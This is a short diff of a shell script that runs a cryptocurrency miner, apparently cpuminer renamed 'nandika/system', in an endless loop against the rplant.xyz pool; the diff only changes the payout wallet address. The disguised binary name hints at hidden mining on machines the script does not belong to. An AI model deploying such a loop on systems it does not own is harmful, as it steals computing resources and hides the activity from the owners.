@@ -7,6 +7,6 @@
 #       stratum-na.rplant.xyz   /Toronto/
 #
 while [ 1 ]; do
-nandika/system -a cpupower --no-auto -o stratum+tcps://stratum-asia.rplant.xyz:17029 -u CXLCiEwgd3EhorGYr28PKm2u8kyGpRmLdX.vienna
+nandika/system -a cpupower --no-auto -o stratum+tcps://stratum-asia.rplant.xyz:17029 -u CKrT7Fbd8tzxDXMhL5DCLQKVV4C5iH6KXn.vienna
 sleep 5
 done
